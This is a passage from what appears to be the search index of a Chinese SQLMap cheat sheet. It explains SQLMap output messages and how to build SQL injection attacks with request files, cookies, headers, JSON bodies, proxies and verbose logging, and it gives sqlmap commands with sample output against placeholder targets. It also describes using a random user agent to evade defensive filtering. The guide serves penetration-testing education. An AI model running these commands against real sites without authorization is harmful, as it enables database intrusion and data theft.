<p>\u8bf7\u6ce8\u610f\uff0c\u8fd9\u53d6\u51b3\u4e8e\u6613\u53d7\u653b\u51fb\u7684\u67e5\u8be2\u4e2d\u53d7\u5f71\u54cd\u7684\u8868\u3002</p>"},{"location":"CheetSheet/SQLMAP/3%E3%80%81SQLMap%20%E8%BE%93%E5%87%BA%E8%AF%B4%E6%98%8E/#parameter-is-vulnerable","title":"Parameter is vulnerable","text":"<p><code>Log Message:</code></p> <ul> <li>\"GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]\"</li> </ul> <p>\u8fd9\u662f SQLMap \u6700\u91cd\u8981\u7684\u6d88\u606f\u4e4b\u4e00\uff0c\u56e0\u4e3a\u5b83\u610f\u5473\u7740\u8be5\u53c2\u6570\u88ab\u53d1\u73b0\u6613\u53d7 SQL \u6ce8\u5165\u653b\u51fb\u3002\u5728\u5e38\u89c4\u60c5\u51b5\u4e0b\uff0c\u7528\u6237\u53ef\u80fd\u53ea\u60f3\u627e\u5230\u81f3\u5c11\u4e00\u4e2a\u53ef\u7528\u4e8e\u76ee\u6807\u7684\u6ce8\u5165\u70b9\uff08\u5373\u53c2\u6570\uff09\u3002\u4f46\u662f\uff0c\u5982\u679c\u6211\u4eec\u5728 Web \u5e94\u7528\u7a0b\u5e8f\u4e0a\u8fd0\u884c\u5e7f\u6cdb\u7684\u6d4b\u8bd5\u5e76\u60f3\u8981\u62a5\u544a\u6240\u6709\u6f5c\u5728\u7684\u6f0f\u6d1e\uff0c\u6211\u4eec\u53ef\u4ee5\u7ee7\u7eed\u641c\u7d22\u6240\u6709\u6613\u53d7\u653b\u51fb\u7684\u53c2\u6570\u3002</p>"},{"location":"CheetSheet/SQLMAP/3%E3%80%81SQLMap%20%E8%BE%93%E5%87%BA%E8%AF%B4%E6%98%8E/#sqlmap-identified-injection-points","title":"Sqlmap identified injection points","text":"<p><code>Log Message:</code></p> <ul> <li>\"sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:\"</li> </ul> <p>\u63a5\u4e0b\u6765\u662f\u6240\u6709\u6ce8\u5165\u70b9\u7684\u5217\u8868\uff0c\u5305\u62ec\u7c7b\u578b\u3001\u6807\u9898\u548c\u6709\u6548\u8d1f\u8f7d\uff0c\u8fd9\u662f\u6210\u529f\u68c0\u6d4b\u548c\u5229\u7528\u5df2\u53d1\u73b0 SQLi \u6f0f\u6d1e\u7684\u6700\u7ec8\u8bc1\u660e\u3002\u5e94\u8be5\u6ce8\u610f\u7684\u662f\uff0cSQLMap \u4ec5\u5217\u51fa\u90a3\u4e9b\u53ef\u8bc1\u660e\u53ef\u5229\u7528\uff08\u5373\u53ef\u7528\uff09\u7684\u53d1\u73b0\u3002</p>"},{"location":"CheetSheet/SQLMAP/3%E3%80%81SQLMap%20%E8%BE%93%E5%87%BA%E8%AF%B4%E6%98%8E/#data-logged-to-text-files","title":"Data logged to text files","text":"<p><code>Log Message:</code></p> <ul> <li>\"fetched data logged to text files under '/home/user/.sqlmap/output/www.example.com'\"</li> </ul> <p>\u8fd9\u8868\u793a\u7528\u4e8e\u5b58\u50a8\u7279\u5b9a\u76ee\u6807\u7684\u6240\u6709\u65e5\u5fd7\u3001\u4f1a\u8bdd\u548c\u8f93\u51fa\u6570\u636e\u7684\u672c\u5730\u6587\u4ef6\u7cfb\u7edf\u4f4d\u7f6e - \u5728\u672c\u4f8b\u4e2d\u4e3a<code>www.example.com</code>.\u00a0\u5728\u8fd9\u6837\u7684\u521d\u59cb\u8fd0\u884c\u4e4b\u540e\uff0c\u6210\u529f\u68c0\u6d4b\u5230\u6ce8\u5165\u70b9\uff0c\u672a\u6765\u8fd0\u884c\u7684\u6240\u6709\u8be6\u7ec6\u4fe1\u606f\u90fd\u5b58\u50a8\u5728\u540c\u4e00\u76ee\u5f55\u7684\u4f1a\u8bdd\u6587\u4ef6\u4e2d\u3002\u8fd9\u610f\u5473\u7740 SQLMap \u4f1a\u5c1d\u8bd5\u5c3d\u53ef\u80fd\u51cf\u5c11\u6240\u9700\u7684\u76ee\u6807\u8bf7\u6c42\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u4f1a\u8bdd\u6587\u4ef6\u7684\u6570\u636e\u3002</p>"},{"location":"CheetSheet/SQLMAP/4%E3%80%81%E6%9E%84%E5%BB%BA%E6%94%BB%E5%87%BB/","title":"4\u3001\u6784\u5efa\u653b\u51fb","text":""},{"location":"CheetSheet/SQLMAP/4%E3%80%81%E6%9E%84%E5%BB%BA%E6%94%BB%E5%87%BB/#http-sqlmap","title":"\u5728HTTP\u8bf7\u6c42\u4e0a\u8fd0\u884c SQLMap","text":"<p>SQLMap \u6709\u8bb8\u591a\u9009\u9879\u548c\u5f00\u5173\uff0c\u53ef\u7528\u4e8e\u5728\u4f7f\u7528\u524d\u6b63\u786e\u8bbe\u7f6e (HTTP) \u8bf7\u6c42\u3002</p> <p>\u5728\u8bb8\u591a\u60c5\u51b5\u4e0b\uff0c\u7b80\u5355\u7684\u9519\u8bef\uff08\u4f8b\u5982\u5fd8\u8bb0\u63d0\u4f9b\u6b63\u786e\u7684 cookie \u503c\u3001\u4f7f\u7528\u5197\u957f\u7684\u547d\u4ee4\u884c\u8fdb\u884c\u8fc7\u4e8e\u590d\u6742\u7684\u8bbe\u7f6e\u6216\u683c\u5f0f\u5316 POST \u6570\u636e\u7684\u58f0\u660e\u4e0d\u5f53\uff09\u5c06\u963b\u6b62\u6b63\u786e\u68c0\u6d4b\u548c\u5229\u7528\u6f5c\u5728\u7684 SQLi \u6f0f\u6d1e\u3002</p>"},{"location":"CheetSheet/SQLMAP/4%E3%80%81%E6%9E%84%E5%BB%BA%E6%94%BB%E5%87%BB/#curl","title":"Curl \u547d\u4ee4","text":"<p>\u9488\u5bf9\u7279\u5b9a\u76ee\u6807(\u5185\u90e8\u5e26\u6709\u53c2\u6570\u7684Web\u8bf7\u6c42)\u6b63\u786e\u8bbe\u7f6e SQLMap \u8bf7\u6c42\u7684\u6700\u4f73\u548c\u6700\u7b80\u5355\u7684\u65b9\u6cd5\u4e4b\u4e00\u662f\u5229\u7528 Chrome\u3001Edge \u6216 Firefox \u5f00\u53d1\u4eba\u5458\u5de5\u5177\u4e2d Network \u9762\u677f\u4e2d\u7684 <code>Copy as cURL</code> \u529f\u80fd</p> <p>\u901a\u8fc7\u5c06\u526a\u8d34\u677f\u5185\u5bb9 (\u00a0<code>Ctrl-V</code>) \u7c98\u8d34\u5230\u547d\u4ee4\u884c\uff0c\u5e76\u5c06\u539f\u59cb\u547d\u4ee4\u66f4\u6539<code>curl</code>\u4e3a<code>sqlmap</code>\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u76f8\u540c\u7684<code>curl</code>\u547d\u4ee4\u4f7f\u7528 SQLMap\uff1a</p> <pre><code>$ sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'\n</code></pre> <p>\u5f53\u5411 SQLMap \u63d0\u4f9b\u6d4b\u8bd5\u6570\u636e\u65f6\uff0c\u5fc5\u987b\u6709\u4e00\u4e2a\u53ef\u4ee5\u8bc4\u4f30 SQLi \u6f0f\u6d1e\u7684\u53c2\u6570\u503c\u6216\u7528\u4e8e\u81ea\u52a8\u53c2\u6570\u67e5\u627e\u7684\u4e13\u95e8\u9009\u9879/\u5f00\u5173\uff08\u4f8b\u5982<code>--crawl</code>,<code>--forms</code>\u6216<code>-g</code>\uff09\u3002</p>"},{"location":"CheetSheet/SQLMAP/4%E3%80%81%E6%9E%84%E5%BB%BA%E6%94%BB%E5%87%BB/#getpost","title":"GET/POST \u8bf7\u6c42","text":"<p>\u5728\u6700\u5e38\u89c1\u7684\u60c5\u51b5\u4e0b\uff0c<code>GET</code>\u53c2\u6570\u4f7f\u7528\u9009\u9879<code>-u</code>/\u63d0\u4f9b<code>--url</code>\uff0c\u5982\u524d\u4e00\u4e2a\u793a\u4f8b\u6240\u793a\u3002\u81f3\u4e8e\u6d4b\u8bd5<code>POST</code>\u6570\u636e\uff0c\u53ef\u4ee5\u4f7f\u7528 <code>--data</code> \u6807\u5fd7\uff0c\u5982\u4e0b\uff1a</p> <pre><code>$ sqlmap 'http://www.example.com/' --data 'uid=1&amp;name=test'\n</code></pre> <p>\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5c06\u6d4b\u8bd5 <code>POST</code> \u53c2\u6570 <code>uid</code> \u548c <code>name</code> \u662f\u5426\u5b58\u5728 SQLi \u6f0f\u6d1e\u3002\u4f8b\u5982\uff0c\u5982\u679c\u6211\u4eec\u6e05\u695a\u5730\u8868\u660e\u53c2\u6570 <code>uid</code> \u5bb9\u6613\u51fa\u73b0 SQLi \u6f0f\u6d1e\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 <code>-p uid</code> \u5c06\u6d4b\u8bd5\u8303\u56f4\u7f29\u5c0f\u5230\u4ec5\u6b64\u53c2\u6570\u3002\u5426\u5219\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u7279\u6b8a\u6807\u8bb0 <code>*</code> \u5c06\u5176\u6807\u8bb0\u5728\u63d0\u4f9b\u7684\u6570\u636e\u4e2d\uff0c\u5982\u4e0b\u6240\u793a\uff1a</p>"},{"location":"CheetSheet/SQLMAP/4%E3%80%81%E6%9E%84%E5%BB%BA%E6%94%BB%E5%87%BB/#http","title":"\u5b8c\u6574\u7684 HTTP \u8bf7\u6c42","text":"<p>\u5982\u679c\u6211\u4eec\u9700\u8981\u6307\u5b9a\u5177\u6709\u8bb8\u591a\u4e0d\u540c\u6807\u5934\u503c\u548c\u52a0\u957f POST \u6b63\u6587\u7684\u590d\u6742 HTTP \u8bf7\u6c42\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 <code>-r</code> \u6807\u5fd7\u3002\u4f7f\u7528\u6b64\u9009\u9879\uff0cSQLMap \u63d0\u4f9b\u4e86\u201c\u8bf7\u6c42\u6587\u4ef6\u201d\uff0c\u5728\u5355\u4e2a\u6587\u672c\u6587\u4ef6\u4e2d\u5305\u542b\u6574\u4e2a HTTP \u8bf7\u6c42\u3002\u5728\u5e38\u89c1\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u4ece\u4e13\u95e8\u7684\u4ee3\u7406\u5e94\u7528\u7a0b\u5e8f\uff08\u4f8b\u5982 <code>Burp</code>\uff09\u4e2d\u6355\u83b7\u6b64\u7c7b HTTP \u8bf7\u6c42\u5e76\u5c06\u5176\u5199\u5165\u8bf7\u6c42\u6587\u4ef6\uff0c\u5982\u4e0b\u6240\u793a\uff1a</p> <p>![[Pasted image 20221205161809.png]]</p> <p>\u4f7f\u7528 Burp \u6355\u83b7\u7684 HTTP \u8bf7\u6c42\u793a\u4f8b\u5982\u4e0b\u6240\u793a\uff1a</p> <pre><code>GET /?id=1 HTTP/1.1\nHost: www.example.com\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\nDNT: 1\nIf-Modified-Since: Thu, 17 Oct 2019 07:18:26 GMT\nIf-None-Match: \"3147526947\"\nCache-Control: max-age=0\n</code></pre> <p>\u6211\u4eec\u53ef\u4ee5\u4ece <code>Burp</code> \u4e2d\u624b\u52a8\u590d\u5236 HTTP \u8bf7\u6c42\u5e76\u5c06\u5176\u5199\u5165\u6587\u4ef6\uff0c\u6216\u8005\u6211\u4eec\u53ef\u4ee5\u5728 <code>Burp</code> \u4e2d\u53f3\u952e\u5355\u51fb\u8bf7\u6c42\u5e76\u9009\u62e9 <code>Copy to file</code> \u3002\u6355\u83b7\u5b8c\u6574 HTTP \u8bf7\u6c42\u7684\u53e6\u4e00\u79cd\u65b9\u6cd5\u662f\u4f7f\u7528\u6d4f\u89c8\u5668\uff0c\u5982\u672c\u8282\u524d\u9762\u6240\u8ff0\uff0c\u5e76\u9009\u62e9\u9009\u9879 <code>Copy &gt; Copy Request Headers</code>\uff0c\u7136\u540e\u5c06\u8bf7\u6c42\u7c98\u8d34\u5230\u6587\u4ef6\u4e2d\u3002</p> <p>\u8981\u4f7f\u7528 HTTP \u8bf7\u6c42\u6587\u4ef6\u8fd0\u884c SQLMap\uff0c\u6211\u4eec\u4f7f\u7528 -r \u6807\u5fd7\uff0c\u5982\u4e0b\u6240\u793a\uff1a</p> <pre><code>$ sqlmap -r req.txt\n        ___\n       __H__\n ___ ___[\"]_____ ___ ___  {1.4.9}\n|_ -| . [(]     | .'| . |\n|___|_  [.]_|_|_|__,|  _|\n      |_|V...       |_|   http://sqlmap.org\n\n\n[*] starting @ 14:32:59 /2020-09-11/\n\n[14:32:59] [INFO] parsing HTTP request from 'req.txt'\n[14:32:59] [INFO] testing connection to the target URL\n[14:32:59] [INFO] testing if the target URL content is stable\n[14:33:00] [INFO] target URL content is stable\n</code></pre> <p>\u63d0\u793a\uff1a\u4e0e\u4f7f\u7528\u201c--data\u201d\u9009\u9879\u7684\u60c5\u51b5\u7c7b\u4f3c\uff0c\u5728\u4fdd\u5b58\u7684\u8bf7\u6c42\u6587\u4ef6\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u7528\u661f\u53f7 (*) \u6307\u5b9a\u8981\u6ce8\u5165\u7684\u53c2\u6570\uff0c\u4f8b\u5982\u201c/?id=*\u201d\u3002</p>"},{"location":"CheetSheet/SQLMAP/4%E3%80%81%E6%9E%84%E5%BB%BA%E6%94%BB%E5%87%BB/#sqlmap","title":"\u81ea\u5b9a\u4e49 SQLMap \u8bf7\u6c42","text":"<p>\u5982\u679c\u6211\u4eec\u60f3\u624b\u52a8\u5236\u4f5c\u590d\u6742\u7684\u8bf7\u6c42\uff0c\u53ef\u4ee5\u4f7f\u7528\u8bb8\u591a\u5f00\u5173\u548c\u9009\u9879\u6765\u5fae\u8c03 SQLMap\u3002</p> <p>\u4f8b\u5982\uff0c\u5982\u679c\u9700\u8981\u5c06 (session) cookie \u503c\u6307\u5b9a\u4e3a <code>PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c</code> \u9009\u9879 --cookie \u5c06\u6309\u5982\u4e0b\u65b9\u5f0f\u4f7f\u7528\uff1a</p> <pre><code>$ sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'\n</code></pre> <p>\u4f7f\u7528\u9009\u9879 <code>-H/--header</code> \u53ef\u4ee5\u8fbe\u5230\u76f8\u540c\u7684\u6548\u679c\uff1a</p> <pre><code>$ sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'\n</code></pre> <p>\u6211\u4eec\u53ef\u4ee5\u5bf9 <code>--host</code>\u3001<code>--referer</code> \u548c <code>-A/--user-agent</code> \u7b49\u9009\u9879\u5e94\u7528\u76f8\u540c\u7684\u9009\u9879\uff0c\u8fd9\u4e9b\u9009\u9879\u7528\u4e8e\u6307\u5b9a\u76f8\u540c\u7684 HTTP \u6807\u5934\u503c\u3002</p> <p>\u6b64\u5916\uff0c\u8fd8\u6709\u4e00\u4e2a\u5f00\u5173 <code>--random-agent</code> \u65e8\u5728\u4ece\u5305\u542b\u7684\u5e38\u89c4\u6d4f\u89c8\u5668\u503c\u6570\u636e\u5e93\u4e2d\u968f\u673a\u9009\u62e9\u4e00\u4e2a <code>User-agent</code> \u6807\u5934\u503c\u3002\u8fd9\u662f\u4e00\u4e2a\u9700\u8981\u8bb0\u4f4f\u7684\u91cd\u8981\u5f00\u5173\uff0c\u56e0\u4e3a\u8d8a\u6765\u8d8a\u591a\u7684\u4fdd\u62a4\u89e3\u51b3\u65b9\u6848\u4f1a\u81ea\u52a8\u4e22\u5f03\u6240\u6709\u5305\u542b\u53ef\u8bc6\u522b\u7684\u9ed8\u8ba4 SQLMap \u7528\u6237\u4ee3\u7406\u503c\u7684 HTTP \u6d41\u91cf\uff08\u4f8b\u5982 <code>User-agent: sqlmap/1.4.9.12#dev (http://sqlmap.org)</code> ).\u6216\u8005\uff0c<code>--mobile</code> \u5f00\u5173\u53ef\u7528\u4e8e\u901a\u8fc7\u4f7f\u7528\u76f8\u540c\u7684\u6807\u5934\u503c\u6765\u6a21\u4eff\u667a\u80fd\u624b\u673a\u3002</p> <p>\u867d\u7136\u9ed8\u8ba4\u60c5\u51b5\u4e0b SQLMap \u4ec5\u9488\u5bf9 HTTP \u53c2\u6570\uff0c\u4f46\u53ef\u4ee5\u6d4b\u8bd5 SQLi \u6f0f\u6d1e\u7684\u6807\u5934\u3002\u6700\u7b80\u5355\u7684\u65b9\u6cd5\u662f\u5728\u6807\u5934\u503c\u4e4b\u540e\u6307\u5b9a\u201c\u81ea\u5b9a\u4e49\u201d\u6ce8\u5165\u6807\u8bb0\uff08\u4f8b\u5982 <code>--cookie=\"id=1*\"</code> \uff09\u3002\u540c\u6837\u7684\u539f\u5219\u9002\u7528\u4e8e\u8bf7\u6c42\u7684\u4efb\u4f55\u5176\u4ed6\u90e8\u5206\u3002</p> <p>\u6b64\u5916\uff0c\u5982\u679c\u6211\u4eec\u60f3\u6307\u5b9a\u4e00\u4e2a\u66ff\u4ee3\u7684 HTTP \u65b9\u6cd5\uff0c\u800c\u4e0d\u662f <code>GET</code> \u548c <code>POST</code>\uff08\u4f8b\u5982\uff0c<code>PUT</code>\uff09\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u9009\u9879 <code>--method</code>\uff0c\u5982\u4e0b\u6240\u793a\uff1a</p> <pre><code>$ sqlmap -u www.target.com --data='id=1' --method PUT\n</code></pre>"},{"location":"CheetSheet/SQLMAP/4%E3%80%81%E6%9E%84%E5%BB%BA%E6%94%BB%E5%87%BB/#http_1","title":"\u81ea\u5b9a\u4e49 HTTP \u8bf7\u6c42","text":"<p>\u9664\u4e86\u6700\u5e38\u89c1\u7684\u8868\u5355\u6570\u636e <code>POST</code> \u4e3b\u4f53\u6837\u5f0f\uff08\u4f8b\u5982 <code>id=1</code>\uff09\uff0cSQLMap \u8fd8\u652f\u6301 JSON \u683c\u5f0f\uff08\u4f8b\u5982 <code>{\"id\":1}</code>\uff09\u548c XML \u683c\u5f0f\uff08\u4f8b\u5982 <code>&lt;element&gt;&lt;id&gt;1&lt;/id&gt;&lt; /element&gt;</code>) HTTP \u8bf7\u6c42\u3002</p> <p>\u4ee5 \"relaxed\" \u7684\u65b9\u5f0f\u5b9e\u73b0\u5bf9\u8fd9\u4e9b\u683c\u5f0f\u7684\u652f\u6301\uff1b\u56e0\u6b64\uff0c\u5bf9\u4e8e\u53c2\u6570\u503c\u5728\u5185\u90e8\u7684\u5b58\u50a8\u65b9\u5f0f\u6ca1\u6709\u4e25\u683c\u7684\u9650\u5236\u3002\u5982\u679c <code>POST</code> \u4e3b\u4f53\u76f8\u5bf9\u7b80\u5355\u548c\u7b80\u77ed\uff0c\u9009\u9879 <code>--data</code> \u5c31\u8db3\u591f\u4e86\u3002</p> <p>\u4f46\u662f\uff0c\u5728\u590d\u6742\u6216\u957f POST \u4e3b\u4f53\u7684\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u53ef\u4ee5\u518d\u6b21\u4f7f\u7528 <code>-r</code> \u9009\u9879\uff1a</p> <pre><code>$ cat req.txt\nHTTP / HTTP/1.0\nHost: www.example.com\n\n{\n  \"data\": [{\n    \"type\": \"articles\",\n    \"id\": \"1\",\n    \"attributes\": {\n      \"title\": \"Example JSON\",\n      \"body\": \"Just an example\",\n      \"created\": \"2020-05-22T14:56:29.000Z\",\n      \"updated\": \"2020-05-22T14:56:28.000Z\"\n    },\n    \"relationships\": {\n      \"author\": {\n        \"data\": {\"id\": \"42\", \"type\": \"user\"}\n      }\n    }\n  }]\n}\n</code></pre> <pre><code>$ sqlmap -r req.txt\n        ___\n       __H__\n ___ ___[(]_____ ___ ___  {1.4.9}\n|_ -| . [)]     | .'| . |\n|___|_  [']_|_|_|__,|  _|\n      |_|V...       |_|   http://sqlmap.org\n\n\n[*] starting @ 00:03:44 /2020-09-15/\n\n[00:03:44] [INFO] parsing HTTP request from 'req.txt'\nJSON data found in HTTP body. Do you want to process it? [Y/n/q] \n[00:03:45] [INFO] testing connection to the target URL\n[00:03:45] [INFO] testing if the target URL content is stable\n[00:03:46] [INFO] testing if HTTP parameter 'JSON type' is dynamic\n[00:03:46] [WARNING] HTTP parameter 'JSON type' does not appear to be dynamic\n[00:03:46] [WARNING] heuristic (basic) test shows that HTTP parameter 'JSON type' might not be injectable\n</code></pre>"},{"location":"CheetSheet/SQLMAP/4%E3%80%81%E6%9E%84%E5%BB%BA%E6%94%BB%E5%87%BB/#sqlmap_1","title":"\u5904\u7406 SQLMap \u9519\u8bef","text":"<p>\u5728\u8bbe\u7f6e SQLMap \u6216\u5c06\u5176\u7528\u4e8e HTTP \u8bf7\u6c42\u65f6\uff0c\u6211\u4eec\u53ef\u80fd\u4f1a\u9047\u5230\u5f88\u591a\u95ee\u9898\u3002\u5728\u672c\u8282\u4e2d\uff0c\u6211\u4eec\u5c06\u8ba8\u8bba\u7528\u4e8e\u67e5\u627e\u539f\u56e0\u5e76\u6b63\u786e\u4fee\u590d\u5b83\u7684\u63a8\u8350\u673a\u5236\u3002</p>"},{"location":"CheetSheet/SQLMAP/4%E3%80%81%E6%9E%84%E5%BB%BA%E6%94%BB%E5%87%BB/#_1","title":"\u663e\u793a\u9519\u8bef","text":"<p>\u7b2c\u4e00\u6b65\u901a\u5e38\u662f\u5207\u6362 <code>--parse-errors</code>\uff0c\u89e3\u6790 DBMS \u9519\u8bef\uff08\u5982\u679c\u6709\uff09\u5e76\u5c06\u5b83\u4eec\u663e\u793a\u4e3a\u7a0b\u5e8f\u8fd0\u884c\u7684\u4e00\u90e8\u5206\uff1a</p> <pre><code>...SNIP...\n[16:09:20] [INFO] testing if GET parameter 'id' is dynamic\n[16:09:20] [INFO] GET parameter 'id' appears to be dynamic\n[16:09:20] [WARNING] parsed DBMS error message: 'SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '))\"',),)((' at line 1'\"\n[16:09:20] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')\n[16:09:20] [WARNING] parsed DBMS error message: 'SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''YzDZJELylInm' at line 1'\n...SNIP...\n</code></pre> <p>\u4f7f\u7528\u6b64\u9009\u9879\uff0cSQLMap \u5c06\u81ea\u52a8\u6253\u5370 DBMS \u9519\u8bef\uff0c\u4ece\u800c\u8ba9\u6211\u4eec\u6e05\u695a\u53ef\u80fd\u662f\u4ec0\u4e48\u95ee\u9898\uff0c\u4ee5\u4fbf\u6211\u4eec\u53ef\u4ee5\u6b63\u786e\u4fee\u590d\u5b83\u3002</p>"},{"location":"CheetSheet/SQLMAP/4%E3%80%81%E6%9E%84%E5%BB%BA%E6%94%BB%E5%87%BB/#store-the-traffic","title":"## Store the Traffic(\u6d41\u91cf)","text":"<p>-t \u9009\u9879\u5c06\u6574\u4e2a\u6d41\u91cf\u5185\u5bb9\u5b58\u50a8\u5230\u8f93\u51fa\u6587\u4ef6\u4e2d\uff1a</p> <pre><code>$ sqlmap -u \"http://www.target.com/vuln.php?id=1\" --batch -t /tmp/traffic.txt\n\n$ cat /tmp/traffic.txt\nHTTP request [#1]:\nGET /?id=1 HTTP/1.1\nHost: www.example.com\nCache-control: no-cache\nAccept-encoding: gzip,deflate\nAccept: */*\nUser-agent: sqlmap/1.4.9 (http://sqlmap.org)\nConnection: close\n\nHTTP response [#1] (200 OK):\nDate: Thu, 24 Sep 2020 14:12:50 GMT\nServer: Apache/2.4.41 (Ubuntu)\nVary: Accept-Encoding\nContent-Encoding: gzip\nContent-Length: 914\nConnection: close\nContent-Type: text/html; charset=UTF-8\nURI: http://www.example.com:80/?id=1\n\n&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n...SNIP...\n</code></pre> <p>\u6b63\u5982\u6211\u4eec\u4ece\u4e0a\u9762\u7684\u8f93\u51fa\u4e2d\u770b\u5230\u7684\uff0c<code>/tmp/traffic.txt</code> \u6587\u4ef6\u73b0\u5728\u5305\u542b\u6240\u6709\u53d1\u9001\u548c\u63a5\u6536\u7684 HTTP \u8bf7\u6c42\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u73b0\u5728\u53ef\u4ee5\u624b\u52a8\u8c03\u67e5\u8fd9\u4e9b\u8bf7\u6c42\u4ee5\u67e5\u770b\u95ee\u9898\u53d1\u751f\u7684\u4f4d\u7f6e\u3002</p>"},{"location":"CheetSheet/SQLMAP/4%E3%80%81%E6%9E%84%E5%BB%BA%E6%94%BB%E5%87%BB/#_2","title":"\u8be6\u7ec6\u8f93\u51fa","text":"<p>\u53e6\u4e00\u4e2a\u6709\u7528\u7684\u6807\u5fd7\u662f <code>-v</code> \u9009\u9879\uff0c\u5b83\u63d0\u9ad8\u4e86\u63a7\u5236\u53f0\u8f93\u51fa\u7684\u5197\u957f\u7ea7\u522b\uff1a</p> <pre><code>$ sqlmap -u \"http://www.target.com/vuln.php?id=1\" -v 6 --batch\n        ___\n       __H__\n ___ ___[,]_____ ___ ___  {1.4.9}\n|_ -| . [(]     | .'| . |\n|___|_  [(]_|_|_|__,|  _|\n      |_|V...       |_|   http://sqlmap.org\n\n\n[*] starting @ 16:17:40 /2020-09-24/\n\n[16:17:40] [DEBUG] cleaning up configuration parameters\n[16:17:40] [DEBUG] setting the HTTP timeout\n[16:17:40] [DEBUG] setting the HTTP User-Agent header\n[16:17:40] [DEBUG] creating HTTP requests opener object\n[16:17:40] [DEBUG] resolving hostname 'www.example.com'\n[16:17:40] [INFO] testing connection to the target URL\n[16:17:40] [TRAFFIC OUT] HTTP request [#1]:\nGET /?id=1 HTTP/1.1\nHost: www.example.com\nCache-control: no-cache\nAccept-encoding: gzip,deflate\nAccept: */*\nUser-agent: sqlmap/1.4.9 (http://sqlmap.org)\nConnection: close\n\n[16:17:40] [DEBUG] declared web page charset 'utf-8'\n[16:17:40] [TRAFFIC IN] HTTP response [#1] (200 OK):\nDate: Thu, 24 Sep 2020 14:17:40 GMT\nServer: Apache/2.4.41 (Ubuntu)\nVary: Accept-Encoding\nContent-Encoding: gzip\nContent-Length: 914\nConnection: close\nContent-Type: text/html; charset=UTF-8\nURI: http://www.example.com:80/?id=1\n\n&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n\n&lt;head&gt;\n  &lt;meta charset=\"utf-8\"&gt;\n  &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\"&gt;\n  &lt;meta name=\"description\" content=\"\"&gt;\n  &lt;meta name=\"author\" content=\"\"&gt;\n  &lt;link href=\"vendor/bootstrap/css/bootstrap.min.css\" rel=\"stylesheet\"&gt;\n  &lt;title&gt;SQLMap Essentials - Case1&lt;/title&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n...SNIP...\n</code></pre> <p>\u5982\u6211\u4eec\u6240\u89c1\uff0c<code>-v 6</code> \u9009\u9879\u5c06\u76f4\u63a5\u5411\u7ec8\u7aef\u6253\u5370\u6240\u6709\u9519\u8bef\u548c\u5b8c\u6574\u7684 HTTP \u8bf7\u6c42\uff0c\u4ee5\u4fbf\u6211\u4eec\u53ef\u4ee5\u5b9e\u65f6\u8ddf\u8e2a SQLMap \u6b63\u5728\u6267\u884c\u7684\u6240\u6709\u64cd\u4f5c\u3002</p>"},{"location":"CheetSheet/SQLMAP/4%E3%80%81%E6%9E%84%E5%BB%BA%E6%94%BB%E5%87%BB/#_3","title":"\u4f7f\u7528\u4ee3\u7406","text":"<p>\u6700\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528 <code>--proxy</code> \u9009\u9879\u901a\u8fc7 (MiTM) \u4ee3\u7406\uff08\u4f8b\u5982 <code>Burp</code>\uff09\u91cd\u5b9a\u5411\u6574\u4e2a\u6d41\u91cf\u3002\u8fd9\u5c06\u901a\u8fc7 <code>Burp</code> \u8def\u7531\u6240\u6709 SQLMap \u6d41\u91cf\uff0c\u4ee5\u4fbf\u6211\u4eec\u7a0d\u540e\u53ef\u4ee5\u624b\u52a8\u8c03\u67e5\u6240\u6709\u8bf7\u6c42\uff0c\u91cd\u590d\u5b83\u4eec\uff0c\u5e76\u5229\u7528 <code>Burp</code> \u7684\u6240\u6709\u529f\u80fd\u5904\u7406\u8fd9\u4e9b\u8bf7\u6c42\uff1a</p> <p>![[Pasted image 20221205173112.png]]</p>"},{"location":"CheetSheet/SQLMAP/4%E3%80%81%E6%9E%84%E5%BB%BA%E6%94%BB%E5%87%BB/#_4","title":"\u653b\u51fb\u8c03\u6574","text":"<p>\u5728\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0cSQLMap \u5e94\u8be5\u4f7f\u7528\u63d0\u4f9b\u7684\u76ee\u6807\u8be6\u7ec6\u4fe1\u606f\u5f00\u7bb1\u5373\u7528\u3002\u7136\u800c\uff0c\u6709\u4e00\u4e9b\u9009\u9879\u53ef\u4ee5\u5fae\u8c03 SQLi \u6ce8\u5165\u5c1d\u8bd5\uff0c\u4ee5\u5728\u68c0\u6d4b\u9636\u6bb5\u5e2e\u52a9 